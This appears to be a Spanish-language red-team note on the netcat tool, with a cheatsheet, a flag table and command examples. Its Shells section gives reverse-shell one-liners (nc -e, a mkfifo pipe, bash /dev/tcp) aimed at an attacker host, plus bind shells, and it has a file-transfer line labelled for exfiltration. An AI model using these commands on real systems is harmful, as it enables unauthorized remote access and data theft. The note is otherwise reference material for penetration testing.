---
aliases:
  - netcat
tags:
  - env/linux
  - asset/network
  - tool/netcat
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Shells]]"
kind: Tool
linked:
  - "[[ncat]]"
  - "[[Reverse Shell]]"
---
# Herramienta `nc` (netcat)

> [!info] nc (Netcat)
> "Navaja suiza" de red: lee/escribe datos sobre TCP/UDP. Cliente o servidor, transferencia de archivos, port scan, shells (bind/reverse), túneles. Sintaxis: `nc [opciones] [host] [puerto]`.
^definicion

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `nc -lvnp 4444` | Listener TCP | Recibir reverse shell |
| `nc <target> <port>` | Conexión TCP raw | Banner grab, testing |
| `nc -u <target> 53` | Conexión UDP | DNS/SNMP testing |
| `nc -lvnp 4444 > file.bin` | Recibir archivo | Exfil simple |
| `nc <target> 4444 < file.bin` | Enviar archivo | Push file |
| `nc -e /bin/sh <attacker> 4444` | Reverse shell (`-e`) | nc traditional |
| `nc -zv <target> 20-25` | Port scan TCP | Probe rápido (usar nmap para serio) |
^nc-cheatsheet

---

## Opciones

| **Flag** | **Qué hace** |
|---|---|
| `-l` | Modo listen (servidor) |
| `-p N` | Puerto local |
| `-n` | Sin resolución DNS |
| `-e prog` | Ejecuta un programa al conectar (solo nc-traditional) |
| `-u` | UDP en vez de TCP |
| `-z` | Zero-I/O: solo escanea, no envía datos |
| `-v` | Verbose |
| `-w N` | Timeout de conexión (segundos) |

---

## Shells

```bash
# --- Reverse shell ---
# Attacker (listener)
nc -lvnp 4444
# Target (con -e)
nc -e /bin/bash <attacker> 4444
# Target (sin -e, mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f
# Target (bash builtin, sin nc)
bash -i >& /dev/tcp/<attacker>/4444 0>&1

# --- Bind shell (víctima escucha) ---
# Target
nc -lvnp 4444 -e /bin/bash
# Attacker
nc <victima> 4444
```

Ver [[Reverse Shell]].

---

## File Transfer / Port Scan

```bash
# Recibir / enviar archivo
nc -lvnp 4444 > recibido.bin      # receptor
nc <target> 4444 < enviar.bin     # emisor

# Port scan
nc -zv <target> 1-1000   # TCP
nc -zuv <target> 53      # UDP probe
```

---

## Notas Relacionadas

- [[ncat]]
- [[Reverse Shell]]
- [[File Transfers]]
